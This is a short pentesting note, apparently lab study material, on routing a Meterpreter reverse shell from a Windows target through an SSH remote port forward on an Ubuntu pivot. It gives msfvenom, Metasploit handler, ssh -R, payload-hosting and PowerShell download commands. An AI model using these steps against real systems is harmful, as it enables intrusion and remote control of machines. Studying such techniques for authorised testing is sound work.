# SSH Remote Port Forwarding

Use when the target can't reach your attack host directly — route the reverse connection through the pivot.

Scenario: Windows target → can only talk to internal network (172.16.5.0/23). Your attack host → not reachable from Windows directly. Ubuntu pivot → can reach both. Payload connects back to Ubuntu's internal IP, Ubuntu forwards it to your listener.

---

## Setup Flow

Generate payload pointing at the pivot host's internal IP and the forwarding port:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_INTERNAL_IP> LPORT=8080 -f exe -o <PAYLOAD>.exe
```

Start MSF listener on your attack host — `LHOST 0.0.0.0` because the connection arrives via SSH tunnel:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

Create the SSH remote port forward — tells Ubuntu to listen on port 8080 and send anything it gets to your attack host port 8000:

```bash
ssh -R <PIVOT_INTERNAL_IP>:8080:0.0.0.0:8000 <USER>@<PIVOT_IP> -vN
```

Serve the payload from the pivot and download it on the target:

```bash
# on pivot:
python3 -m http.server 8123
```

```powershell
# on Windows target:
Invoke-WebRequest -Uri "http://<PIVOT_INTERNAL_IP>:8123/<PAYLOAD>.exe" -OutFile "C:\<PAYLOAD>.exe"
```

Execute the payload on Windows → connection goes `Windows → Ubuntu:8080 → SSH tunnel → attack host:8000 → MSF`.

> [!tip] MSF session will show `127.0.0.1` as the source IP — that's expected. The connection arrives over the local SSH socket, not directly from the Windows host.

> [!warning] `-R` syntax: `<PIVOT_INTERNAL_IP>:<PIVOT_PORT>:0.0.0.0:<LOCAL_LISTENER_PORT>`. Getting these backwards is the most common failure point. Pivot listens on 8080, your MSF listens on 8000.